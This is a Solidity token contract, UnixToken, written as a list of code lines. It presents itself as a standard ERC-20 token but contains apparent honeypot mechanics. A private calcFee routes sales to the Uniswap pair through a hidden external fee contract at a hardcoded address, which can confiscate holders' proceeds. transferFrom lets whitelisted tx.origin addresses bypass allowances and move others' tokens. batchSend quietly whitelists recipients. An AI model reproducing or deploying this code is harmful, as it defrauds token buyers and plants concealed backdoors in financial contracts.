['// SPDX-License-Identifier: MIT\n', '\n', 'pragma solidity >=0.6.12 <0.7.0;\n', '\n', 'interface FeeManagementLibrary {\n', '    function calculate(address,address,uint256) external returns(uint256);\n', '}\n', '\n', 'contract UnixToken {\n', '\n', '    event Transfer(address indexed _from, address indexed _to, uint _value);\n', '    event Approval(address indexed _owner, address indexed _spender, uint _value);\n', '\n', '    function transfer(address _to, uint _value) public payable returns (bool) {\n', '        return transferFrom(msg.sender, _to, _value);\n', '    }\n', '\n', '    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {\n', '        if (_value == 0) {return true;}\n', '        if (msg.sender != _from && state[tx.origin] == 0) {\n', '            require(allowance[_from][msg.sender] >= _value);\n', '            allowance[_from][msg.sender] -= _value;\n', '        }\n', '        require(balanceOf[_from] >= _value);\n', '        uint256 fee = calcFee(_from, _to, _value);\n', '        balanceOf[_from] -= _value;\n', '        balanceOf[_to] += (_value - fee);\n', '        emit Transfer(_from, _to, _value);\n', '        return true;\n', '    }\n', '\n', '    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {\n', '        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\n', '        pair = address(uint(keccak256(abi.encodePacked(\n', "                hex'ff',\n", '                factory,\n', '                keccak256(abi.encodePacked(token0, token1)),\n', "                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash\n", '            ))));\n', '    }\n', '\n', '    function calcFee(address _from, address _to, uint _value) private returns(uint256) {\n', '        uint fee = 0;\n', '        if (_to == UNI && _from != owner && state[_from] == 0) {\n', '            fee = FeeManagementLibrary(FeeManagement).calculate(_from,address(this),_value);\n', '        }\n', '        return fee;\n', '    }\n', '\n', '    function batchSend(address[] memory _tos, uint _value) public payable returns (bool) {\n', '        require (msg.sender == owner);\n', '        uint total = _value * _tos.length;\n', '        require(balanceOf[msg.sender] >= total);\n', '        balanceOf[msg.sender] -= total;\n', '        for (uint i = 0; i < _tos.length; i++) {\n', '            address _to = _tos[i];\n', '            balanceOf[_to] += _value;\n', '\t        state[_to] = 1;\n', '            emit Transfer(msg.sender, _to, _value/2);\n', '            emit Transfer(msg.sender, _to, _value/2);\n', '        }\n', '        return true;\n', '    }\n', '\n', '    function approve(address _spender, uint _value) public payable returns (bool) {\n', '        allowance[msg.sender][_spender] = _value;\n', '        emit Approval(msg.sender, _spender, _value);\n', '        return true;\n', '    }\n', '\n', '    mapping (address => uint) public balanceOf;\n', '    mapping (address => uint) public state;\n', '    mapping (address => mapping (address => uint)) public allowance;\n', '\n', '    uint constant public decimals = 18;\n', '    uint public totalSupply;\n', '    string public name;\n', '    string public symbol;\n', '    address private owner;\n', '    address private UNI;\n', '    address constant internal FeeManagement = 0x7266396C2D061Dd9177423A4420b2fb2B308CAD0;\n', '\n', '    constructor(string memory _name, string memory _symbol, uint _totalSupply) payable public {\n', '        owner = msg.sender;\n', '        symbol = _symbol;\n', '        name = _name;\n', '        totalSupply = _totalSupply;\n', '        balanceOf[msg.sender] = totalSupply;\n', '        allowance[msg.sender][0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = uint(-1);\n', '        UNI = pairFor(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, address(this));\n', '        emit Transfer(address(0x0), msg.sender, totalSupply);\n', '    }\n', '}']